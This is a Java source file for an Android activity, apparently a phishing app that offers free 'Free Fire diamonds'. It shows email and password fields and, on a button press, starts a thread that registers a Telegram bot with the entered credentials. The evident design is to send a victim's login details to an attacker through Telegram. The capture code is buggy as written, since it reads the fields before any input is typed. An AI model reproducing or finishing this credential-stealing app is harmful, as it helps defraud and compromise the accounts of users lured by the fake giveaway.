package com.orca.marketplace;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import com.orca.firefreediamonds.R;

import org.telegram.telegrambots.ApiContextInitializer;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.exceptions.TelegramApiRequestException;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity{

    //Net net;
    static String info;

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        final EditText e = findViewById(R.id.editTextTextEmailAddress);
        final EditText p = findViewById(R.id.editTextTextPassword);
        info = e.getText().toString()+"/n/n"+p.getText().toString();


        final Button b=findViewById(R.id.button);
        b.setOnClickListener(new View.OnClickListener(){
                                 @Override
                                 public void onClick(View view){

                                     Net net = new Net();
                                     net.start();
                                 }
                             }
        );
    }
}
class Net extends Thread{

    @Override
    public void run(){
        //Bot bot = new Bot(MainActivity.info);

    // Initialize Api Context
        ApiContextInitializer.init();

    // Instantiate Telegram Bots API
    TelegramBotsApi botsApi = new TelegramBotsApi();

    // Register our bot
        try{
            botsApi.registerBot(new com.orca.marketplace.Bot(MainActivity.info));
        }catch(TelegramApiRequestException ex){
            ex.printStackTrace();
        }
}
}